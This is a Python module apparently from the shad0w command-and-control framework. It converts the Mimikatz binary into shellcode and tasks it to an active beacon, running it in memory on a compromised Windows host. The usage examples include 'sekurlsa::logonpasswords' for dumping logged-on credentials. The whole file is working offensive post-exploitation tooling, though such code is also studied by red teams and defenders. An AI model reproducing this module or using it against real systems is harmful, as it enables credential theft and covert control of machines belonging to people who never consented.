#
# Execute mimikatz on a session
#

import argparse

from lib import shellcode

__description__ = "Execute Mimikatz commands in memory"
__author__ = "@_batsec_, @gentilkiwi"
__type__ = "module"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of Mimikatz binary
MIMIKATZ_BIN = "/root/shad0w/bin/mimikatz.x64.exe"

# did the command error
ERROR = False
error_list = ""


def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"


def exit(status=0, message=None):
    if message != None: print(message)
    return


def mimikatz_callback(shad0w, data):
    data = data.replace(".#####.", "\033[1;32m.#####.\033[0m")
    data = data.replace(".## ^ ##.", "\033[1;32m.##\033[0m \033[1;39m^\033[0m \033[1;32m##.\033[0m")
    data = data.replace("## / \\ ##", "\033[1;32m##\033[0m \033[1;39m/ \\\033[1;32m \033[1;32m##\033[0m")
    data = data.replace("## \\ / ##", "\033[1;32m##\033[0m \033[1;39m\\ /\033[1;32m \033[1;32m##\033[0m")
    data = data.replace("'## v ##'", "\033[1;32m'##\033[0m \033[1;39mv\033[1;32m \033[1;32m##'\033[0m")
    data = data.replace("'#####'", "\033[1;32m'#####'\033[0m")

    print(data)

    return ""


def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon.", log=True)
        return

    # usage examples
    usage_examples = """

Examples:

mimikatz
mimikatz -x coffee
mimikatz -x sekurlsa::logonpasswords
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='mimikatz',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-x", "--execute", nargs='+', required=True, help="Mimikatz command to execute")
    parse.add_argument("-n", "--no-exit", action="store_true", required=False, help="Leave mimikatz running")

    # make sure we don't die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if not args.execute:
        print(error_list) 
        parse.print_help()
        return
    
    if args.execute:
        params = ' '.join(args.execute)

        if not args.no_exit:
            params = params + " exit"
        
        # kind of a hack to make sure we integrate nice with the shellcode generator
        args.param = args.execute
        args.cls = False
        args.method = False
        args.runtime = False
        args.appdomain = False

        b64_comp_data = shellcode.generate(MIMIKATZ_BIN, args, params)
    
    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[shad0w.current_beacon]["callback"] = mimikatz_callback
